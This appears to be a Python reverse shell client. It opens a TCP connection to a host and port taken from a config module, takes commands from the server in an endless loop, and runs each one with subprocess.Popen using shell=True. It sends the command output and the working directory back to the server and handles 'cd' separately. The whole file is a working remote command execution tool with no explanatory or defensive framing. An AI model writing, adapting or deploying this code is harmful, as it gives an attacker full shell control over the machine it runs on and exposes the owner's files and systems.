import logging
import os
import socket
import subprocess
import sys

from config import HOST, PORT

def create_socket():
    """Creates a socket object."""
    try:
        # TCP connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        logging.info("socket creation successful!")
        return sock, None 
    except socket.error as err:
        logging.error("Socket creation error:  ", err)
        return None, err 
        sys.exit(1)


def connect_to_server(sock): 
        ''' Connects to the server address '''
        try: 
            sock.connect((HOST, PORT))       
            logging.info('Ready to interact with server.')
            return True 
        except socket.error as err: 
            logging.error('Could not connect to the server: {}'.format(err)) 
            return False 


def commands_handler(sock): 
    ''' Interacts with the server with commands. '''
    # only taking command from server.
    try: 
        while True: 
            data = sock.recv(1024).decode('utf-8')
            print('command: ', data)

            try:  
                if data[:2] == 'cd': 
                    cwd = os.getcwd()
                    print(cwd)
                    os.chdir(data[3:])
                    cwd = os.getcwd()  # str data 
                    print(cwd)
                terminal = subprocess.Popen(
                        data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
                )
                terminal_byte_data = terminal.stdout.read() + terminal.stderr.read()
                cwd = os.getcwd() + '> '
                output_data = terminal_byte_data + cwd.encode()  # make byte
                sock.send(output_data)
                
                # print the command in terminal making str
                print(terminal_byte_data.decode('utf-8')) 
            except BrokenPipeError as err: 
                logging.error('Subprocess pipe is broken: {}'.format(err))
                close_connection(sock)
    except ConnectionResetError as err: 
        logging.error('Connection is rest by peer: {}'.format(err))
        close_connection(sock)


def close_connection(sock):
    """Closes the client socket."""
    sock.close()
    logging.info("Client is shutdown!")
    sys.exit(0)


def main(): 
    ''' Main entrypoint of client. '''
    logging.basicConfig(level=logging.INFO)

    sock, err = create_socket()
    if sock: 
        is_connected = connect_to_server(sock)
        if is_connected: 
            try: 
                commands_handler(sock)
                close_connection(sock)
            except KeyboardInterrupt: 
                logging.info("Client shutdown initiated by user.")
                close_connection(sock)
        else: 
            logging.error('Aborting the connection: could not connect to the server.')
    else: 
        logging.error('Aborting the connection: socket could not be created: %s', err)


if __name__ == '__main__': 
    main()
